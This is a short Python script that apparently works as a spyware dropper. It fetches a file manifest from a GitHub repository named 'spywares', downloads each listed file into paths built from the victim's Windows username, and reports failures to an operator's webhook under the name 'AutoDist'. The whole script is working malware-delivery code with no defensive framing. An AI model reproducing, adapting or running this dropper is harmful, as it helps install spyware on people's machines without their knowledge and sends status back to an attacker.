import sys
import os
import json

try:
	import requests
except:
	os.system("py -m pip install requests")
finally:
	import requests
	
print(sys.argv)

user = os.environ['username']
with open("webhook.json", "r") as f:
	whData = json.loads(f.read())
	cmdURL = whData["cmd"]
try:
	pwd=sys.argv[1]
	response = requests.get(f"https://github.com/PVER-Programz/spywares/raw/main/TheSusanProject/f{pwd}.json")
	inidata = json.loads(response.text)

	for x in inidata:
		response = requests.get(x)
		code = response.content
		filepath = inidata[x].replace("<username>", user)+"/"+x.split("/")[-1]
		if not os.path.exists(os.path.dirname(filepath)):
			os.makedirs(os.path.dirname(filepath))
		with open(filepath, 'wb') as f:
			f.write(code)
except IndexError:
	usrhook = {"content": f"Package ID not found",
			"username": "AutoDist",
			"avatar_url": 'https://seeklogo.com/images/A/auto-distribution-logo-E9831C9910-seeklogo.com.png',
			"tts": "false"}

	requests.post(cmdURL, json=usrhook)

except Exception as e:
	usrhook = {"content": f"Exception {e}",
			"username": "AutoDist",
			"avatar_url": 'https://seeklogo.com/images/A/auto-distribution-logo-E9831C9910-seeklogo.com.png',
			"tts": "false"}

	requests.post(cmdURL, json=usrhook)